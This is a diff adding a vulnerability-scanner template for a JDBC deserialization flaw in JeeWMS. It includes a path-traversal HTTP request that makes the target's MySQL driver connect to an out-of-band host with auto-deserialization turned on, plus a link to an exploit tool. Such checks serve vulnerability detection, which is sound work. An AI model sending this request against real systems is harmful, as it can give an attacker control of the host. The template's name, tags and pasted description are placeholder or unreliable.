@@ -1,0 +1,22 @@
+id: JEEWMS-jdbc-rce
+
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: JeeWMS是一款免费开源的仓库管理系统，支持3PL和厂内物流，涵盖订单管理，仓储管理，计费管理，现场作业，RFID，AGV等功能。本文介绍了系统的简介，功能，安装，截图和链接，适合仓储企业和开发者参考。厦门市灵鹿谷科技有限公司JEEWMS    dynamicDataSourceController.do JDBC反序列化漏洞，导致攻击者可以获取系统主机权限
+  reference:
+    - https://
+  tags: tags
+
+http:
+  - raw:
+      - |-
+        GET /rest/../dynamicDataSourceController.do?testConnection&driverClass=com.mysql.jdbc.Driver&url=jdbc:mysql://{{interactsh-url}}/test?detectCustomCollations=true%26autoDeserialize=true&dbUser=test_user HTTP/1.1
+        Host: {{Hostname}}
+    matchers:
+      - type: word
+        part: interactsh_protocol # Confirms the DNS Interaction
+        words:
+          - "dns"
+#利用工具：https://github.com/fnmsd/MySQL_Fake_Server
